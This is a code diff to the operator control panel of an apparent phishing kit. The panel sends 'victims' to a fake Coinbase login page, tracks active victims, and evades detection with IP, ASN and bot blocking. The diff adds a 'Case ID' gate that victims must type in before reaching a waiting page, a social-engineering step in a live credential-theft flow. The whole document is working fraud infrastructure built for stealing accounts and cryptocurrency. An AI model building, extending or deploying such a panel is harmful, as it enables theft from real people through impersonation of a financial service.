@@ -36,7 +36,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         switch($command) {
             case 'redirect_to_coinbase':
                 $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                         VALUES ('redirect', 'coinbaselogin.html', NOW())";
+                         VALUES ('redirect', 'coinbaselogin.php', NOW())";
                 $_SESSION['success_message'] = 'Victim will be redirected to Coinbase Login';
                 break;
                 
@@ -87,6 +87,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         ]);
         
         $_SESSION['success_message'] = 'Redirect command sent to victim';
+    }
+
+    // Handle case ID management
+    if (isset($_POST['case_id_action'])) {
+        $case_id_action = $_POST['case_id_action'];
+        
+        switch($case_id_action) {
+            case 'set_case_id':
+                $case_id = $_POST['case_id'] ?? '';
+                if (!empty($case_id) && strlen($case_id) === 6 && is_numeric($case_id)) {
+                    // Store case ID in database
+                    $query = "INSERT INTO case_settings (setting_name, setting_value, created_at) 
+                             VALUES ('current_case_id', :case_id, NOW())
+                             ON CONFLICT (setting_name) 
+                             DO UPDATE SET setting_value = :case_id, created_at = NOW()";
+                    $stmt = $db->prepare($query);
+                    $stmt->execute([':case_id' => $case_id]);
+                    $_SESSION['success_message'] = 'Case ID set to: ' . $case_id;
+                } else {
+                    $_SESSION['error_message'] = 'Please enter a valid 6-digit case ID';
+                }
+                break;
+                
+            case 'clear_case_id':
+                $query = "DELETE FROM case_settings WHERE setting_name = 'current_case_id'";
+                $db->exec($query);
+                $_SESSION['success_message'] = 'Case ID cleared';
+                break;
+        }
     }
     
     header('Location: /panel.php');
@@ -162,6 +191,19 @@ try {
     error_log("Victims table error: " . $e->getMessage());
 }
 
+// Create case_settings table if not exists
+try {
+    $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
+        id SERIAL PRIMARY KEY,
+        setting_name VARCHAR(100) UNIQUE NOT NULL,
+        setting_value TEXT NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_case_table);
+} catch (Exception $e) {
+    error_log("Case settings table error: " . $e->getMessage());
+}
+
 // Get current redirect - FIXED VERSION
 try {
     $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
@@ -179,6 +221,17 @@ try {
     }
 }
 $current_redirect = $current_redirect ? $current_redirect['target'] : 'None';
+
+// Get current case ID
+$current_case_id = '';
+try {
+    $case_query = "SELECT setting_value FROM case_settings WHERE setting_name = 'current_case_id'";
+    $case_stmt = $db->query($case_query);
+    $case_result = $case_stmt->fetch(PDO::FETCH_ASSOC);
+    $current_case_id = $case_result ? $case_result['setting_value'] : '';
+} catch (Exception $e) {
+    error_log("Failed to get case ID: " . $e->getMessage());
+}
 
 // Get active victims (last 30 minutes) - FIXED VERSION
 $active_victims = [];
@@ -496,7 +549,7 @@ if (isset($_SESSION['error_message'])) {
                                     <td>
                                         <form method="POST" style="display: inline;">
                                             <input type="hidden" name="victim_id" value="<?php echo $victim['id']; ?>">
-                                            <input type="hidden" name="victim_redirect_target" value="coinbaselogin.html">
+                                            <input type="hidden" name="victim_redirect_target" value="coinbaselogin.php">
                                             <button type="submit" name="redirect_victim" class="btn success btn-small">
                                                 <i class="material-icons tiny">login</i> Coinbase
                                             </button>
@@ -576,7 +629,7 @@ if (isset($_SESSION['error_message'])) {
                     <div class="row">
                         <div class="input-field col s12 m8">
                             <input type="text" id="custom_target" name="redirect_target" 
-                                   placeholder="coinbaselogin.html, index.php, or any URL">
+                                   placeholder="coinbaselogin.php, index.php, or any URL">
                             <label for="custom_target">Target Page/URL</label>
                         </div>
                         <div class="col s12 m4">
@@ -590,13 +643,53 @@ if (isset($_SESSION['error_message'])) {
                     <div class="row">
                         <div class="col s12">
                             <p class="grey-text">Examples: 
-                                <code>coinbaselogin.html</code>, 
+                                <code>coinbaselogin.php</code>, 
                                 <code>index.php</code>, 
                                 <code>https://example.com</code>
                             </p>
                         </div>
                     </div>
                 </form>
+            </div>
+
+            <!-- Case ID Management -->
+            <div class="card">
+                <h5>🔐 Case ID Management</h5>
+                <div class="row">
+                    <div class="col s12 m6">
+                        <div class="victim-status">
+                            <h6>Current Case ID</h6>
+                            <h4 style="color: #64b5f6;"><?php echo $current_case_id ? htmlspecialchars($current_case_id) : 'Not Set'; ?></h4>
+                        </div>
+                    </div>
+                    <div class="col s12 m6">
+                        <form method="POST">
+                            <div class="input-field">
+                                <input type="text" id="case_id" name="case_id" 
+                                       placeholder="Enter 6-digit case ID" maxlength="6" pattern="[0-9]{6}"
+                                       value="<?php echo htmlspecialchars($current_case_id); ?>">
+                                <label for="case_id">Case ID</label>
+                            </div>
+                            <div style="margin-top: 15px;">
+                                <input type="hidden" name="case_id_action" value="set_case_id">
+                                <button type="submit" class="btn success waves-effect waves-light">
+                                    <i class="material-icons left">lock</i>
+                                    Set Case ID
+                                </button>
+                                <button type="submit" name="case_id_action" value="clear_case_id" 
+                                        class="btn warning waves-effect waves-light">
+                                    <i class="material-icons left">clear</i>
+                                    Clear
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col s12">
+                        <p class="grey-text">Victims will need to enter this exact 6-digit Case ID to proceed to the waiting page.</p>
+                    </div>
+                </div>
             </div>
 
             <!-- System Information -->
@@ -606,10 +699,10 @@ if (isset($_SESSION['error_message'])) {
                     <div class="col s12 m6">
                         <p><strong>Server Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                         <p><strong>PHP Version:</strong> <?php echo phpversion(); ?></p>
-                        <p><strong>Protected Pages:</strong> index.php, panel.php, admin/</p>
+                        <p><strong>Protected Pages:</strong> index.php, coinbaselogin.php, waiting.php, admin/</p>
                     </div>
                     <div class="col s12 m6">
-                        <p><strong>Victim Flow:</strong> index.php → [Redirect] → Target</p>
+                        <p><strong>Victim Flow:</strong> index.php → coinbaselogin.php → waiting.php</p>
                         <p><strong>Active Protection:</strong> IP Blocking, ASN Blocking, Bot Detection</p>
                         <p><strong>Session:</strong> <?php echo $_SESSION['username']; ?> (<?php echo $_SERVER['REMOTE_ADDR']; ?>)</p>
                     </div>
